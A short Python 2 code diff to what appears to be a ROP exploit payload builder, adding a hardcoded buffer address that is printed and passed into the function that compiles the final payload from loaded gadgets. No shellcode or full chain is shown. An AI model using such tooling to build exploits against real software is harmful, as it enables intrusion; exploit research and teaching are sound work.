@@ -44,6 +44,9 @@ def main(args):
 		run_test_suite()
 		print "------------------"
 	else:
+		BUFFER_ADDR = 0xb77ff300
+		print "[info] Buffer located at {}".format(BUFFER_ADDR)
+
 		# Regular mode.
 		corpus = args[0]
 		fname = args[1]
@@ -132,7 +135,7 @@ def main(args):
 			print "[+] ropgadget: Loaded gadgets from \"{}\" (got {})".format(fname, num_gadgets_total)
 			
 			# compile the actual payload.
-			full_payload = compile_payload(payload, binary_gadgets, DEBUG=DEBUG)
+			full_payload = compile_payload(payload, binary_gadgets, BUFFER_ADDR, DEBUG=DEBUG)
 			print "[+] Compiled final payload."
 
 			if DEBUG:
